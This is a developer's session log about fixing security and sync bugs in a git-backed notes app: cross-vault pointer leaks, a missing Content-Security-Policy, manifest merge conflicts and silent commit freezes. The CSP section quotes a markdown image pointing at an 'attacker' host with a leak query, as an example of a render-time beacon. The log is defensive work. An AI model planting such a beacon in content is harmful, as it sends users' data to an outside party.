# 2026-07-20 — the four bugs an adversarial review found

An adversarial review of a *plan* (discussions/forums, PR review, cloud agents) mostly
demolished the plan, and its most useful output was incidental: four defects that were real
today and independent of whether that feature ever ships. This session fixed all four — then
**reviewed the fixes adversarially and found four of them incomplete**, which is the section
worth reading. The sections below are in the order the work happened, so 1–4 describe the
*first* attempt and are corrected further down; the code matches the corrected version.

## The process failure that came first, and matters most

`docs/context/collaboration-design.md:205` **already specified** the forums design — one file
per message, ULID-named, the Maildir argument, the conflict reasoning — including the view
pollution cost, labelled *"Unbudgeted… it must land with the feature, not after."* The plan
presented all of that as new. `decisions.md:258` requires grepping `docs/context/` before any
ruling ships; that did not happen. **Read the docs before designing. This file exists because
the last one was not read.**

## 1. `copy_note` leaked cross-vault pointers through frontmatter

`decisions.md:505` promised *"a copy can never point outside its new vault"*. It could:
`strip_cross_vault` rewrote the **body** only, so `obj.title` and every value in `obj.extra`
went across untouched. A hand-added `source: note:01ARZ…` in a personal note, copied into a
shared vault, is a pointer into a private vault written into someone else's permanent git
history — silent, and unrecoverable once pushed.

Fixed with `refs::strip_value` (recurses into `PropertyValue::List`, leaves non-text variants
alone — an `Int` has no room for a reference) applied to `title` and every `extra` value.
**This was not enough — see the second pass below: `status` and `tags` were still leaking.**

## 2. There was no Content-Security-Policy anywhere in `fm-serve`

The one worth being uncomfortable about. `![](https://attacker/p.png?leak=…)` in a merged or
shared note beacons **on render, on the user's machine**, with no script involved — so it
survives DOMPurify and it survives human review. The app self-hosts Excalidraw's fonts to
avoid exactly this class and then left note content unguarded.

`write_response` now sends a policy on every response, and blobs get `default-src 'none';
sandbox` behind their existing `attachment` disposition. `script-src 'self'` carries **no**
`'unsafe-inline'`, which cost one real change: Excalidraw's `EXCALIDRAW_ASSET_PATH` line moved
from inline in `index.html` to `ui/public/excalidraw-asset-path.js`. Rationale per clause is in
`decisions.md`; the guard is pinned by
`every_response_carries_a_policy_that_stops_a_note_phoning_home`.

## 3. `manifest.json` conflicted as plain text

It is git-tracked *and* staged on every commit, so two people each attaching a file — an
ordinary Tuesday — both rewrote it from the same base and got `<<<<<<<` inside a JSON document
no user wrote, can read, or can resolve. And once conflicted, `commit_all` correctly refuses to
commit *anything else in the vault*, so the whole thing silently stops recording. Reproduced
against real git before fixing.

A `sha256 -> size` map of content-addressed blobs **cannot** conflict — the key is the content
— so the merge is a union: `manifest.json merge=fm-manifest` in `.gitattributes`, `fm
merge-manifest` as the driver (registered and cleared alongside `merge.fm`, same
stale-path rules). Proven end-to-end through a real `git pull` in
`two_people_attaching_files_do_not_conflict_in_the_manifest`. **The deletion rule this first
version carried was wrong and has been removed — see the second pass.**

## 4. One conflicted note silently stopped every commit

`commit_all` says "clean tree" and "I refuse, this vault is mid-merge" with the same
`Ok(false)`. The sync loop read that as success and reported `synced` over a vault that had
stopped recording. The `commit` dispatch arm now answers `CommitResult { committed, conflicts }`
and `sync.svelte.ts::commitStep` stops both of *its* entry points at the existing `conflicts`
phase. The `git.rs`/`git_native.rs` signatures were deliberately left alone — see `decisions.md`.
**The 5 s auto-commit does not go through the sync loop and was missed — see the second pass.**

## Incidental: a test that was a time bomb

`set_property_is_written_to_disk_and_survives_reload` pinned `updated` to `2026-07-20 09:00`
while leaving `created` at *now*. It passed for as long as the wall clock was behind that
instant and started failing this morning, on a day nobody had changed anything. Both stamps are
pinned now. **Worth remembering as a shape, not an incident:** any test comparing a hard-coded
instant against `OffsetDateTime::now_utc()` has an expiry date. A grep found no others.

## Then a second adversarial pass, over these fixes. Four of them were incomplete.

Four agents, one lens each. This section is the valuable half of the day.

1. **The `copy_note` fix still leaked.** `status` and `tags` are *typed* `Object` fields, not
   `extra` entries, so a fix reasoning about the property map never saw them — and they are
   free-form user text (`board` groups by any status string). `status: blocked on note:01…`
   went across verbatim. **The test written alongside the fix could not catch it**: it built its
   haystack from `title` + `extra`. Now every human-typable field is enumerated explicitly, and
   the test asserts over all of them. *Lesson: enumerate the fields, do not iterate a map.*
2. **The manifest merge was wrong at the design level**, not in its details — see `decisions.md`.
   It honoured "absent on their side" as a deletion, but the blob store is gitignored and
   per-machine, so absence means "they don't have those bytes". It converged on the intersection
   and erased records of blobs that exist. Now purely additive.
3. **The merge driver could exit non-zero**, which git reads as a conflict while leaving the
   file clean — the exact trap `install_merge_driver` documents, and here it freezes commits
   vault-wide. Now every side is read leniently and it always exits 0. Android had no driver at
   all and was routing `manifest.json` through the *note* merger; `git_native::pull` now routes
   it by path to the same union.
4. **The commit-freeze fix missed the caller that matters.** `App.svelte`'s 5 s auto-commit —
   the one `commit_all` calls "the default path, not an edge case" — discarded the result. Only
   the sync loop had been fixed.

Also from that pass: no `frame-ancestors` (any page could frame the app on its fixed localhost
port), the 416 branch skipped the headers, and **the phone had `"csp": null`** — after a session
spent closing the beacon hole, Android was the only wholly unguarded surface. All fixed; the
Android policy was then **built, installed and launched on the real phone** (2026-07-20): the
CSP is embedded in the APK, the frontend compiled into `libformicaria_mobile_lib.so` carries no
inline `<script>`, and a launch produced **zero CSP violations** in logcat. Still unverified,
because a launch does not reach them: **a note with an image** (the `fmblob://` → 
`http://fmblob.localhost` rewrite, i.e. whether `img-src` is right) and **a whiteboard**
(`worker-src`, fonts). Both need a human to open one.

Accepted, not fixed: `'unsafe-eval'` stays refused, so Excalidraw's font subsetter throws and
exported SVGs lose embedded fonts. Allowing it would hand every string in a note a path to
execution.

## Threads: written, reviewed, reverted

A backend for discussion-as-notes was built (`reply`/`thread`/`notes_filter`, a `verify` orphan
check, 8 tests) and then **removed in the same session**, before commit. The review found four
confirmed defects, one of which is worth recording because it is not obvious:

- **`thread`'s value is a bare ULID with no scheme**, so `refs::strip_cross_vault` — which keys
  off `note:`/`asset:`/`sha256:` prefixes — cannot see it. Copying a message to another vault
  therefore wrote a cross-vault pointer into permanent git history, hid the copy from every view
  in its own vault, *and* leaked a vault-B message into vault A's thread. The leak fix and the
  new feature were each fine alone and broken together. **Any future id-valued property must be
  spelled `note:<ulid>`, or `refs` must learn about it.**
- **`thread` is an unnamespaced English word.** `set_property` is public and `board` groups by
  any key, so grouping a board by `thread` and dragging one card writes `thread: <column>` and
  the note vanishes from every view — one gesture, silent, no undo affordance.
- Replying to a *message* threaded to the message, not the note, putting the reply in no view
  and no thread. `reply()` must re-root.
- `thread()` compares ULIDs as strings, so a lowercase value orphans a message; `activity()` had
  no exclusion at all; and it cost 170 ms at 30k notes, as much as listing the whole vault.

The costed spec and these findings live in `outstanding.md §2.5`. It returns as one slice with
its UI, not as an unreachable backend.

`pixi run ci` green.

## The plan those bugs came out of — verdict unchanged

- **Phase 1 (threads)** is viable and doubly sanctioned, but costs five core changes, not two
  frontmatter keys: `capture` cannot set a custom property; `Renderer::Thread` is impossible
  (`base()` returns a static query, a thread is runtime-parameterised → a new dispatch command);
  and view contamination breaks the `/` note-picker, which calls `recent()`. The fix with the
  best ratio is a **separate directory** via `Descriptor.notes_dir`, not a filter conjunct in
  five places.
- **Phase 2 (review)** — ship the read half (branch list, diff). Merge/delete are corruption-path
  writes and need their own decision plus both backends.
- **Phase 3 (cloud agents)** — **do not ship.** Barred by `MASTERPLAN.md:63` (*no AI features in
  v1*), and the premise is gone anyway: GitHub Models retires 30 July 2026, we are inside the
  brownout window, and there is no free hosted successor.
